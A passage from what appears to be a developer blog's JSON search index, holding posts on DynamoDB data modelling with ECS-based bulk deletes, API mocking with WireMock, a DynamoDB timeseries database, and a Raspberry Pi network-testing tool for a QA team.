for that user:\n\nrecord = {\n    &#39;user_id&#39;: {\n        &#39;S&#39;: str(obj.user_id)\n    },\n    &#39;num_points&#39;: {\n        &#39;N&#39;: str(obj.num_points)\n    },\n    &#39;num_maps&#39;: {\n        &#39;N&#39;: str(obj.num_maps)\n    }\n}\n\n\nMaps table\nThe map table is a little bit more complex, because it has to keep relations between users and maps. Therefore, I use the range key to save the unique identifier of the map:\n\n{\n    &quot;TableName&quot;: MAPS_TABLE,\n    &quot;KeySchema&quot;: [\n        {\n            &quot;AttributeName&quot;: &quot;user_id&quot;,\n            &quot;KeyType&quot;: &quot;HASH&quot;\n        },\n{\n            &quot;AttributeName&quot;: &quot;map_id&quot;,\n            &quot;KeyType&quot;: &quot;RANGE&quot;\n        },\n    ],\n    &quot;AttributeDefinitions&quot;: [\n        {\n            &quot;AttributeName&quot;: &quot;map_id&quot;,\n            &quot;AttributeType&quot;: &quot;S&quot;\n        },\n{\n            &quot;AttributeName&quot;: &quot;user_id&quot;,\n            &quot;AttributeType&quot;: &quot;S&quot;\n        }\n    ]\n}\n\n\nThere are additional attributes associated to the map (self-explanatory):\n\n{\n    &#39;user_id&#39;: {\n        &#39;S&#39;: str(obj.user_id)\n    },\n    &#39;map_id&#39;: {\n        &#39;S&#39;: str(obj.map_id)\n    },\n    &#39;name&#39;: {\n        &#39;S&#39;: str(obj.name)\n    },\n    &#39;description&#39;: {\n        &#39;S&#39;: str(obj.description)\n    },\n    &#39;num_points&#39;: {\n        &#39;N&#39;: str(obj.num_points)\n    }\n}\n\n\nPoints table\nThis is most complex table. The keys are similar to the maps, the range key is used to store the unique identifier of the map:\n\n{\n    &quot;TableName&quot;: POINTS_TABLE,\n    &quot;KeySchema&quot;: [\n        {\n            &quot;AttributeName&quot;: &quot;map_id&quot;,\n            &quot;KeyType&quot;: &quot;HASH&quot;\n        },\n        {\n            &quot;AttributeName&quot;: &quot;point_id&quot;,\n            &quot;KeyType&quot;: &quot;RANGE&quot;\n        },\n    ],\n    &quot;AttributeDefinitions&quot;: [\n        {\n            &quot;AttributeName&quot;: &quot;map_id&quot;,\n            &quot;AttributeType&quot;: &quot;S&quot;\n        },\n        {\n            &quot;AttributeName&quot;: &quot;point_id&quot;,\n            &quot;AttributeType&quot;: &quot;S&quot;\n        },\n    ]\n}\n\nAnd the additional parameters:\n{\n    &#39;point_id&#39;: {\n        &#39;S&#39;: obj.point_id\n    },\n    &#39;map_id&#39;: {\n        &#39;S&#39;: str(obj.map_id)\n    },\n    &#39;lat&#39;: {\n        &#39;S&#39;: str(obj.lat)\n    },\n    &#39;lon&#39;: {\n        &#39;S&#39;: str(obj.lon)\n    },\n    &#39;date&#39;: {\n        &#39;N&#39;: str(obj.epoch)\n    },\n    &#39;name&#39;: {\n        &#39;S&#39;: str(obj.name)\n    },\n}\n\nThe challenge with this model is to be able to delete a map with a large number of points. It is counter-intuitive, because one might think that removing only the points with the primary key of the map will make the work but ...\nTHIS WILL NOT WORK!\nDue to the way DynamoDB is implemented, this is not possible (https://stackoverflow.com/questions/34259358/dynamodb-delete-all-items-having-same-hash-key). In that kind of tables, you need to provide the primary key and the range key in order to delete an item.\nSince the number of items can be large, it could take a lot of capacity to delete a the points. I do not want to consume that capacity, so I will let DynamoDB throttle the deletes to adapt to the capacity.\nThe project is serverless (Lambda) based and trying to delete a large number of points will result in timeouts when DynamoDB throttle the deletes. There are two possible solutions here: increase the write capacity of the table (increase cost) or increase the Lambda timeout (increase cost).\nAfter thinking a little bit, the valid solution I choose is to launch an ECS Task with the logic to delete the large number of maps:\n\nclient.run_task(\n    cluster=&quot;arn:aws:ecs:eu-west-1:***:cluster/remove-points-cluster&quot;,\n    taskDefinition=&quot;arn:aws:ecs:eu-west-1:***:task-definition/remove-points&quot;,\n    overrides={\n        &quot;containerOverrides&quot;: [\n            {\n                &quot;name&quot;: &quot;remove-points&quot;,\n                &quot;environment&quot;: [\n                    {\n                        &quot;name&quot;: &quot;MAP_ID&quot;,\n                        &quot;value&quot;: map_id\n                    }\n                ]\n            }\n        ]\n    },\n    launchType=&quot;FARGATE&quot;,\n    networkConfiguration={\n        &quot;awsvpcConfiguration&quot;: {\n            &quot;subnets&quot;: [&quot;1&quot;, &quot;2&quot;],\n            &quot;assignPublicIp&quot;: &quot;ENABLED&quot;\n        }\n    }\n)\n\nThe best part of this ECS Task is that only took 5 minutes to use the same code base and Dockerize the logic of removing the points!\nNow the long-running task of delete a large number of points is done in ECS, where the pricing model is pay per use. Since this is a feature that is not going to happen a lot, it&#39;s perfectly fine.\n"
} ,
  
  {
    "title"    : "Mocking external API with wiremock",
    "category" : "",
    "tags"     : " java, testing, e2e, docker, wiremock",
    "url"      : "/mocking-external-apis-wiremock/",
    "date"     : "November 27, 2018",
    "excerpt"  : "What happens when you are developing a component that heavily rely on an external API you do not control? Or even worst, that still does not exist. How could you test your component without connecting the external dependency? When we don&#39;t have co...",
  "content"  : "What happens when you are developing a component that heavily rely on an external API you do not control? Or even worst, that still does not exist. How could you test your component without connecting the external dependency? When we don&#39;t have control over the API that we need to integrate, we need a tool like a &quot;mock server&quot;.\nThis article will discover and provide a bootstrap project for wiremock. More info: wiremock.org\n\nQuoting from their website:\nWireMock is a simulator for HTTP-based APIs. Some might consider it a service virtualization tool or a mock server.\nAt its core is a Java software that receives HTTP requests with some mapped requests to responses\nTL;DR: https://github.com/adriangalera/docker-compose-wiremock/\nConfiguring wiremock\nConfiguring wiremock only consists on defining the requests to be mocked and the response that should be answered on the presence of the mocked request.\nDocker\nOne nice way of integrate wiremock with your current testing environment is using it inside docker. There&#39;s this project https://github.com/rodolpheche/wiremock-docker that provides the wiremock service to docker.\nIn order to configure it, you must create the following folder structure:\n.\n├── Dockerfile\n└── stubs\n    ├── __files\n    │   └── response.json\n    └── mappings\n        └── request.json\n\n\nThe mappings folder contains all the mocked requests definitions and __files contains the response JSON for the mocked requests as shown before.\nExample\nLet&#39;s say we have an external API developed by another team in the company under the host externalapi.com and is not yet finished. The call that our service needs to perform is externalapi.com/v1/resource/resource1 and will respond:\n\n{\n    &quot;hello&quot;:&quot;world&quot;\n}\n\nLet&#39;s configure wiremock, so we can start working on our service in parallel with the other team.\n\n\n  Configure the request mapping\n\n\n{\n    &quot;request&quot;:{\n        &quot;method&quot;:&quot;GET&quot;,\n        &quot;urlPathPattern&quot;:&quot;/v1/resource/([a-zA-Z0-9-\\\\_]*)&quot;\n    },\n    &quot;response&quot;:{\n        &quot;status&quot;:200,\n        &quot;bodyFileName&quot;:&quot;response.json&quot;,\n        &quot;headers&quot;:{\n            &quot;Content-Type&quot;:&quot;application/json&quot;\n        }\n    }\n}\n\n\n  Configure the response\n\n\n{\n    &quot;hello&quot;:&quot;world&quot;\n}\n\n\n\n  Test it\n\n\ndocker-compose up --build -d\ncurl http://localhost:7070/v1/resource/resource1\n{\n&quot;hello&quot; : &quot;world&quot;\n}\n\n\nYay! It worked!\n\nThe only missing point is configure the actual component to point to the mocked server. For example with ribbon:\n\nexternalservice.ribbon.listOfServers=http://localhost:7070\n\n"
} ,
  
  {
    "title"    : "Timeseries database with DynamoDB",
    "category" : "",
    "tags"     : " aws, cloud, dynamodb, kinesis, python",
    "url"      : "/timeseries-db-dynamodb/",
    "date"     : "September 21, 2018",
    "excerpt"  : "Working with sensor data, we need to store timestamped data in a way that was easily checked and show it in graphs. This post explains the process we follow to end up implementing a timeseries database on DynamoDB.\n\nRequirements\nThe problem was pr...",
  "content"  : "Working with sensor data, we need to store timestamped data in a way that was easily checked and show it in graphs. This post explains the process we follow to end up implementing a timeseries database on DynamoDB.\n\nRequirements\nThe problem was pretty straightforward at the beginning: store temporal data that came from multiple sensors where one sensor could have more than one metric. For instance: one battery sensor might monitor the battery level as well as the battery voltage. The sensor data data flows continuously at an undetermined interval, it can be 1 minute, 5 minutes, ... Generally speaking the data can be represented as:\nMETRIC NAME - TIMESTAMP - VALUE\nIn order to support the defined usage scenarios we need to provide a tool able to:\n\n\n  Perform temporal queries: give me the metric between 2017/05/21 00:00:00 and 2017/08/21 00:30\n  Support multiple granularity: second, minute, hour, …\n  Support TTL for cold data: expire cold data\n  Perform in a cost-efficient manner\n\n\nAvailable technologies\nWhen one thinks about database at first the relational ones appear as the first option. The problem with relational databases such as MySQL, PostgreSQL, .. is that we the database becomes very unusable when the size of the tables grows. And in this case the data  will grow a lot with the usage.\nFurthermore, when the data is so big the indexes start to generate headaches making the queries take a lot of time.\nFinding these drawbacks in the traditional relational databases, we shift towards NoSQL databases.\nThe first one that came into our mind (because we had some previous experience with it) was whisper https://github.com/graphite-project/whisper. This database is a small component of the graphite project, basically is a wrapper to write the temporal data to a file performing multiple roll-up aggregations on the fly. This looked promising, however, when we heavy loaded it performed very poorly.\nSince the platform we were building it was AWS based, we decided to analyse what Amazon can provide us and finally found DynamoDB!\nDynamoDB at the rescue!\nDynamoDB is a key-value database that supports the configuration of item TTL and its costs are predictable because are in function of the required capacity.\nOne might ask: how can I store the presented model in a key-value database? The magic comes with the composite key feature: https://aws.amazon.com/es/blogs/database/choosing-the-right-dynamodb-partition-key/\n\nKnowing DynamoDB\nQuoting AWS documentation:\nThis type of key is composed of two attributes. The first attribute is the partition key, and the second attribute is the sort key.\nTherefore, we can use the metric name as the partition key and the timestamp and the sort key and the sensor value as the DynamoDB object:\n\n  \nDynamoDB Key Schema\n\nRollup aggregations?\nNow we can store the timestamped data in DynamoDB, however, what happens with the multiple granularity requirement? DynamoDB has a nice feature called DynamoDB Streams.\nDynamoDB Streams sends the events generated in the database (new records, edit, delete, ...) to a an AWS Lambda. Hence, we can perform the aggregations for the multiple granularities as soon as a new data value arrives. In order to perform the storage of the multiple aggregations, we can define one table for each aggregation.\nThe implementation: DynamoDB Timeseries Database\nFinally, in order to complete the setup we have used a serverless approach in order to allocate the cost of the project to the required capacity.\nThe final structure of the implemented solution looked like this:\n\n\nComponents of DynamoDB TimeseriesDB\n\n1) The service that uses the DynamoDB Timeseries database is a serverless application with an API Gateway calling an Lambda function. One of the steps of the business logic is communicate with the DynamoDB Insert Lambda.\n2) The insertion mechanism of the database is by invoking an AWS Lambda function. This function inserts the timestamped data into the lower granularity table.\n3) When the Insert function inserts the data into the lower granularity table, DynamoDB Streams invokes the AWS Lambda involved in performing the roll-up aggregations.\n4) The Aggregate function has the logic implemented on how to perform multiple aggregations (average, sum, count, ...).\n5) Each time serie can be configured to have different aggregations, TTL, timezone to perform temporal aggregation, etc... There are an additional lambda in order to configure the timeserie parameters.\n6) Once the aggregation is performed, the data is stored into the appropriate DynamoDB table according to the granularity: minute, hour, day, month, year, ...\nWith this solution we achieve a solution where we can fine tune the capacity of the database.\nProduction time!\nWhen we put this system into production, some issues arises with the capacity of the DynamoDB. When the incoming data flows faster than the reserved capacity in DynamoDB, the lambda functions became very slow and resulting in a high number of timeout errors.\nThe reasons for this is that when DynamoDB is running at capacity, it throttle requests, making the client adjust its speed to the reserved capacity. This works good for a traditional client, however it breaks with the serverless approach, because the Lambda functions were taking too much time.\nIn order to fix situation, we add another component to the system: an AWS Kinesis Stream https://aws.amazon.com/kinesis. Instead of writing directly to the DynamoDB table, the service Lambda function now writes the data into a Kinesis stream.\nIn the other side of the stream, we place a Kinesis consumer that is able to consume items from the stream in batches of items. Additionally, we are able to control the insertion speed of items in DynamoDB by sleeping some time between batch consumption. Since this consumer needs to be 24/7, it runs on a traditional EC2 instance.\nNow the scheme looks like this:\n\n\nAdding Kinesis into the TimeseriesDB\n\nThe additional point (7) shows the Kinesis stream where the items are being inserted by the Service Lambda function and consumed by the DynamoDB Timeseries DB Kinesis Consumer. The configured batch size (B) and sleep time (T) allows the consumer to buffer the insertion of data up to the reserved DynamoDB capacity.\nShow me the code\nAn open sourced version of the production code can be found here:\nhttps://github.com/adriangalera/dynamodb-timeseries\n"
} ,
  
  {
    "title"    : "Raspberry Pi for QA",
    "category" : "",
    "tags"     : " linux, nodejs, raspberry-pi, qa, testing",
    "url"      : "/raspberry-pi-qa/",
    "date"     : "September 21, 2018",
    "excerpt"  : "On a previous company the QA team needed to perform some scenarios that were difficult to reproduce, for instance force a buffering event. Their setup require deep technical understanding of Linux. In order to ease its world, I decided to create a...",
  "content"  : "On a previous company the QA team needed to perform some scenarios that were difficult to reproduce, for instance force a buffering event. Their setup require deep technical understanding of Linux. In order to ease its world, I decided to create a neat service running on a Raspberry Pi.\n\nThe problems:\nConcretely, the scenarios that the QA needed to cover were:\nRestrict the network performance\nThe test that the QA team were performing, included provoking buffering issues in media players. They found issues on how this could be achieved: in Chrome it could be achieved through Developer Tools, but what about mobile devices, or even worst: some weird embedded media players?\nAccess Geo-blocked content\nSince the company had customers world-wide and some of them used Geo-blocked content, they need to access those contents through the use of VPNs. This required spending some time configuration the VPN clients on their side\nIP Blocking\nThere were some scenarios (I cannot remember right now) that required to block the connection to some IP. This is really easy to do on a UNIX machine with iptables, but good luck doing that on Windows.\nModify DNS records\nIt were some scenario where they needed to change the DNS records. For instance: www.google.com -&amp;gt; 192.168.1.100. I don&#39;t remember the rationale to this requirement :(\nAnalyse HTTPS traffic\nIn the majority of the environments the connections with the company server&#39;s were made with HTTPS. This caused a little bit of headache while analysing the HTTP traffic.\nThe solutions ...\nSince most of the scenarios require some networking tweaks, the obvious decision was Linux, even better: Raspberry Pi. The project consist in a NodeJS Express application that executed scripts on the RaspberryPi.\nThe raspberry PI have two network interfaces: the LAN and the WiFi. The configuration is setup in the interfaces file:\n\nauto lo\niface lo inet loopback\nauto eth0\nauto wlan0\n#static ethernet conf\niface eth0 inet static\naddress 192.168.1.100\nnetmask 255.255.255.0\ngateway\t192.168.1.1\ndns-nameservers 8.8.4.4\niface wlan0 inet static\naddress 192.168.150.1\nnetmask 255.255.255.0\n\n\nIn the WiFi interface hostapd service is configured in order to serve a WiFi connection. This will configure the traffic outgoing traffic from wlan0 to eth0.\nPlaying with tc and ifb\nThe network performance restrictions can be applied using the tc command and the ifb module on Linux. This module redirects the traffic from one real network interface to a virtual one. When the traffic passes through the ifb0 interface the token bucket (htb) applies the network configuration\n\n#Enable ifb module and setup the ifb0 interface\nmodprobe ifb numifbs=1 &amp;amp;amp;&amp;amp;amp; ip link set dev ifb0 up\n#Create a device that redirects all the traffic\n#from eth0 to ifb0\ntc qdisc add dev eth0 handle ffff: ingress &amp;amp;amp;&amp;amp;amp; \\\ntc filter add dev eth0 parent ffff: protocol ip u32 \\\nmatch u32 0 0 action mirred egress redirect dev ifb0\n#Modify the token bucket configuration\ntc qdisc add dev ifb0 root handle 1: htb default 10 &amp;amp;amp;&amp;amp;amp; \\\ntc class add dev ifb0 parent 1: classid 1:1 htb rate 1mb &amp;amp;amp;&amp;amp;amp; \\\ntc class add dev ifb0 parent 1:1 classid 1:10 htb rate 1mb\n\n\nOpenVPN and Iptables\nIn order to be able to avoid the Geo-blocking of contents, the company provide us a commercial VPN. This consisted on a series of OpenVPN configuration scripts for multiple countries. Therefore, the app only needs to call openvpn:\n\nopenvpn ALBANIA-TCP.ovpn\n\n\nIt&#39;s really easy to block an IP on a Linux box, the app only needs to call the iptables, for example:\n\niptables -I FORWARD -s 192.168.150.0/24 -d 8.8.8.8  -j DROP\n\n\nThis snippet blocks the outgoing connections to 8.8.8.8 that goes out from the WiFi network\nNetworking stuff ...\nRegarding DNS Spoofing, it&#39;s a little bit trickier, however the dnsmasq service is very useful in that situation.\n\n\ndnsmasq schema\n\nThe clients connected to the WiFi will resolve the DNS queries thanks to the dnsmasq client listening to incoming connections. This service is able to perform custom DNS resolutions based on a file that works like a /etc/hosts file.\n\n192.168.56.1   ubuntu.tecmint.lan\n192.168.56.10  centos.tecmint.lan\n\n\nRegarding the HTTPS Sniffer, the implemented solution implies having the SSL certificates from the company installed in a reverse proxy that terminates the SSL connection and forwards the HTTP traffic to an internal server that stores the decrypted requests on a cache.\n\n\ndnsmasq schema\n\nThis cache can be queried from the GUI to inspect the requests. There&#39;s an additional implementation that allows to run pcap capture software directly on the network interface to inspect the packets from the UI.\nThis environment requires a little setup, that is the configuration of the proxy on the computers of the QA team.\nFinally, the QA team were able to save a lot of time setting up their scenarios. With this app it&#39;s only a matter of clicking buttons instead of executing weird scripts\nThe code ...\nDon&#39;t blame too much on the code quality: the whole project was implemented few years ago and as a side project on one or two weekends\nhttps://github.com/adriangalera/rpitester\nHere&#39;s a video of me presenting that project ;)\n\n"
} 
  
  
  
]
